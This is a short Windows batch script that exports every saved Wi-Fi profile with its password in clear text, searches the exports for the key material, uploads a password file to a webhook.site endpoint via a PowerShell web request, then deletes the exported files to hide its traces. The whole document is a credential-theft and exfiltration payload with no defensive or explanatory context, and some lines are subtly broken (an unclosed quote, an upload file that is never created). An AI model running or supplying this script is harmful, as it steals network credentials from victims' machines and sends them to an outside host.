@echo off
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial
powershell Invoke-WebRequest -Uri https://webhook.site/your-webhook-site-token -Method POST -InFile Wi-Fi-PASS
del Wi-* /s /f /q
exit
